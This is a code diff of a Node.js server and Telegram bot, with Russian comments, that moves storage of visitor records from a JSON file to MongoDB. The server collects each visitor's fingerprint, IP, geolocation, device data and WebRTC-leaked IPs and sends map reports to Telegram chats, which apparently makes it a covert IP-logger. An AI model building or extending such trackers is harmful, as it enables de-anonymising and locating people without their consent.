@@ -7,6 +7,7 @@ const fingerprint = require('./modules/fingerprint');
 const visitorInfo = require('./modules/visitorinfo');
 const parseDevice = require('./modules/parsdevice');
 const reportInfo = require('./modules/reportinfo');
+const mongo = require('./modules/mongo');
 
 const app = express();
 app.use(express.json());
@@ -41,19 +42,14 @@ app.post(`/bot${TELEGRAM_TOKEN}`, (req, res) => {
   res.sendStatus(200);
 });
 
-bot.onText(/\/stats/, (msg) => {
-  // перечитываем visitors.json с диска для актуальности
-  let freshVisitors = {};
+bot.onText(/\/stats/, async (msg) => {
   try {
-    if (fs.existsSync(VISITORS_FILE)) {
-      freshVisitors = JSON.parse(fs.readFileSync(VISITORS_FILE));
-    }
+    const count = await mongo.getVisitorsCount();
+    bot.sendMessage(msg.chat.id, `📊 Всего визитов: ${count}`);
   } catch (err) {
-    console.error('Ошибка чтения visitors.json:', err);
-    freshVisitors = {};
+    console.error('Ошибка MongoDB /stats:', err);
+    bot.sendMessage(msg.chat.id, 'Ошибка при получении статистики.');
   }
-  const count = Object.keys(freshVisitors).length;
-  bot.sendMessage(msg.chat.id, `📊 Всего визитов: ${count}`);
 });
 
 app.get('/ping-bot', (req, res) => {
@@ -81,7 +77,6 @@ app.post('/collect', async (req, res) => {
 
   // Парсинг устройства
   const uaData = parseDevice(userAgent || '');
-  // Приводим к нужному формату для reportInfo
   if (!uaData.device) uaData.device = 'неизвестно';
   if (!uaData.browser) uaData.browser = '';
   if (!uaData.os) uaData.os = '';
@@ -91,7 +86,7 @@ app.post('/collect', async (req, res) => {
   const geoStr = geoData.location || 'неизвестно';
 
   // Определение статуса визита
-  const status = visitorInfo.getVisitStatus(visitors, fp, ip);
+  const status = visitorInfo.getVisitStatus({}, fp, ip); // пустой объект, Mongo теперь источник
   const visitId = fp || `ip_${ip}`;
 
   // --- Краткий отчет для основного сообщения ---
@@ -107,7 +102,6 @@ app.post('/collect', async (req, res) => {
   });
 
   // --- Подробный отчет для второй кнопки ---
-  // Собираем WebRTC IPs (если есть)
   let webrtcIps = [];
   try {
     const webrtcLog = fs.readFileSync('webrtc_ips.log', 'utf8').split('\n').reverse();
@@ -121,7 +115,6 @@ app.post('/collect', async (req, res) => {
     }
   } catch {}
 
-  // Формируем detailsMsg через reportinfo
   let detailsMsg = reportInfo.buildDetailsReport({
     geoData,
     userAgent,
@@ -134,10 +127,8 @@ app.post('/collect', async (req, res) => {
     platform: req.body.platform
   });
 
-  // --- Кнопки и карта ---
   const inlineKeyboard = reportInfo.buildInlineKeyboard(visitId);
 
-  // Отправка в Telegram: карта с отчетом в подписи, затем кнопка
   for (const chatId of CHAT_IDS) {
     try {
       if (geoData.lat && geoData.lon && ip && ip !== 'неизвестно') {
@@ -150,8 +141,8 @@ app.post('/collect', async (req, res) => {
     }
   }
 
-  // Сохраняем детали для callback (можно доработать под БД)
-  visitors[visitId] = {
+  // Сохраняем визит в MongoDB
+  await mongo.saveVisitor(visitId, {
     fingerprint: fp,
     ip,
     time: new Date().toISOString(),
@@ -159,14 +150,8 @@ app.post('/collect', async (req, res) => {
     geo: geoStr,
     uaParsed: uaData,
     detailsMsg,
-    visitId // сохраняем visitId для отладки
-  };
-
-  try {
-    fs.writeFileSync(VISITORS_FILE, JSON.stringify(visitors, null, 2));
-  } catch (err) {
-    console.error('Ошибка записи visitors.json:', err);
-  }
+    visitId
+  });
 
   res.json({ ok: true });
 });
@@ -177,24 +162,16 @@ bot.on('callback_query', async (query) => {
   const data = query.data;
   if (data && data.startsWith('details_')) {
     const visitId = data.replace('details_', '');
-    // перечитываем visitors.json с диска для актуальности
-    let freshVisitors = {};
     try {
-      if (fs.existsSync(VISITORS_FILE)) {
-        freshVisitors = JSON.parse(fs.readFileSync(VISITORS_FILE));
+      const visit = await mongo.getVisitor(visitId);
+      if (visit && visit.detailsMsg) {
+        await bot.sendMessage(chatId, visit.detailsMsg, { reply_to_message_id: query.message.message_id });
+      } else {
+        await bot.sendMessage(chatId, 'Детальная информация не найдена. Проверьте, что визит был зафиксирован и сохранён.', { reply_to_message_id: query.message.message_id });
       }
     } catch (err) {
-      console.error('Ошибка чтения visitors.json:', err);
-      freshVisitors = {};
-    }
-    const visit = freshVisitors[visitId];
-    if (visit && visit.detailsMsg) {
-      await bot.sendMessage(chatId, visit.detailsMsg, { reply_to_message_id: query.message.message_id });
-    } else {
-      // Debug output for diagnosis
-      console.error('Детальная информация не найдена для visitId:', visitId);
-      console.error('Доступные visitId:', Object.keys(freshVisitors));
-      await bot.sendMessage(chatId, 'Детальная информация не найдена. Проверьте, что визит был зафиксирован и сохранён.', { reply_to_message_id: query.message.message_id });
+      console.error('Ошибка MongoDB details:', err);
+      await bot.sendMessage(chatId, 'Ошибка при получении деталей визита.', { reply_to_message_id: query.message.message_id });
     }
   }
 });
